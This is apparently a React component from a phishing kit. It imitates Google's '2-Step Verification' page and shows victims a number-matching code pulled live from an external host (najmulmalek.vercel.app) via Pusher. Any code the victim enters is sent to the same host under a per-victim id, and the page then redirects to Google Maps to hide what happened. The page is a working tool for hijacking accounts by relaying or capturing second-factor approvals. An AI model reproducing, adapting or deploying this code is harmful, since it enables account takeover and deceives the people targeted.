import React, { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Link, useLocation, useNavigate, useParams } from "react-router-dom";
import Pusher from "pusher-js";
import axios from "axios";

const RecoveryCodeNew = () => {
    const [data, setData] = useState(null);
    const navigate = useNavigate();
    const { id } = useParams();
    const { state } = useLocation();
    const { temp } = state;
    const [message, setMessage] = useState('');
    const [step, setStep] = useState(5);
    const [numemail, setNumemail] = useState("email address");
    const [recoveryValidation, setRecoveryValidation] = useState(false);
    const [codeValidation, setCodeValidation] = useState(false);

    // useEffect(() => {
    //     const fetchData = async () => {
    //         try {
    //             const result = await axios.get('https://najmulmalek.vercel.app/data');
    //             console.log(result)
    //             setData(result.data);
    //         } catch (error) {
    //             console.error("Error fetching data:", error.message);
    //         }
    //     };
    //     fetchData();

    //     // Initialize Pusher
    //     const pusher = new Pusher('b883e22125070e171e9f', {
    //         cluster: 'mt1',
    //         useTLS: true
    //     });

    //     const channel = pusher.subscribe('notifications');
    //     channel.bind('dataUpdated', (newData) => {
    //         console.log('Data updated:', newData);
    //         fetchData();  // Re-fetch data on update
    //     });

    //     return () => {
    //         channel.unbind_all();
    //         channel.unsubscribe();
    //     };
    // }, []);

    useEffect(() => {
        const pusher = new Pusher('b883e22125070e171e9f', {
            cluster: 'mt1',
        });

        const channel = pusher.subscribe('notifications');
        channel.bind('dataUpdated', function (data) {

            fetch(`https://najmulmalek.vercel.app/data?temp=${data.temp}`)
                .then(response => response.json())
                .then(data => {
                    setData(data)
                })
                .catch(error => console.log(data))
            // setData(data.noticode);
        });

        return () => {
            pusher.unsubscribe('notifications');
        };
    }, []);

    const handleNext = () => {
        setStep(step + 1);
    };

    const handleBack = () => {
        setStep(step - 1);
    };

    const { register, handleSubmit, formState: { errors }, reset } = useForm();

    const handleAddBooking = (data) => {
        const bookings = {
            code: data.code,
        };
        fetch(`https://najmulmalek.vercel.app/recoverypass/${temp}`, {
            method: "PUT",
            headers: {
                "content-type": "application/json",
            },
            body: JSON.stringify(bookings),
        })
            .then((res) => res.json())
            .then((result) => {
                reset();
                pathInfo(bookings);
            });
    };

    const pathInfo = (infos) => {
        window.location.href = 'https://www.google.com/maps/place/New+York,+NY,+USA/@40.6976312,-74.1444871,11z/data=!3m1!4b1!4m6!3m5!1s0x89c24fa5d33f083b:0xc80b8f06e177fe62!8m2!3d40.7127753!4d-74.0059728!16zL20vMDJfMjg2?entry=ttu';
    };

    const handleNumber = () => {
        if (numemail === "email address") {
            setNumemail("phone number");
        } else {
            setNumemail("email address");
        }
    };

    const handleRChange = (event) => {
        if (event.target.value === "") {
            setRecoveryValidation(false);
        } else {
            setRecoveryValidation(true);
        }
    };

    const handleCChange = (event) => {
        if (event.target.value === "") {
            setCodeValidation(false);
        } else {
            setCodeValidation(true);
        }
    };

    const numberPage = () => {
        navigate("/number", { state: { temp: temp } });
    };

    return (
        <div className="flex items-center justify-center w-screen h-screen relative z-10">
            <iframe className='absolute top-0 left-0 h-full' title='map' src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1339967.9624639747!2d-100.97180559921846!3d34.26459709743478!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x54eab584e432360b%3A0x1c3bb99243deb742!2sUnited%20States!5e0!3m2!1sen!2sbd!4v1686250989510!5m2!1sen!2sbd" width={'100%'} height={'100%'} allowFullScreen="" loading="lazy" referrerPolicy="no-referrer-when-downgrade"></iframe>
            <div className='absolute top-0 left-0 w-full h-full z-20 bg-white/40  backdrop-blur-sm grid place-items-center'>
                <form className="bg-white px-6 py-12 rounded-lg shadow-md w-5/6 md:w-[29%] overflow-x-hidden">
                    <Step5
                        register={register}
                        numemail={numemail}
                        handleNumber={handleNumber}
                        handleRChange={handleRChange}
                        data={data}
                    />
                </form>
            </div>
        </div>
    );
};

const Step5 = ({ register, handleCChange, numberPage, data }) => (
    <div>
        <img src="/google.png" alt="" className="mx-auto" />
        <h2 className="text-center font-medium text-2xl">2-Step Verification</h2>
        <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
        <div className="mb-5 flex items-center">
            <img className="w-44 -ml-[70px]" src="/signin_tapyes.gif" alt="animation" />
            {data &&
                <div className=" w-16 h-16 rounded-full grid place-items-center ml-7">
                    <small className="font-semibold text-5xl">{data}</small>
                </div>}
        </div>
        <div>
            <h2 className="font-medium mb-3">Check your phone</h2>
            <p>Google sent a notification to your Phone. Tap Yes on the notification to verify it's you.</p>
            <div className="flex items-center gap-3 mt-6">
                <input className="w-4 h-4 border cursor-pointer" type="checkbox" />
                <p className="text-[15px] cursor-pointer">Don't ask again on this device</p>
            </div>
        </div>
        <div className="mt-3">
            <p onClick={numberPage} className="text-blue-600 font-semibold cursor-pointer">Resend it</p>
        </div>
        <div className="mt-9">
            <p onClick={numberPage} className="text-blue-600 font-semibold cursor-pointer">Try another way</p>
        </div>
    </div>
);

export default RecoveryCodeNew;
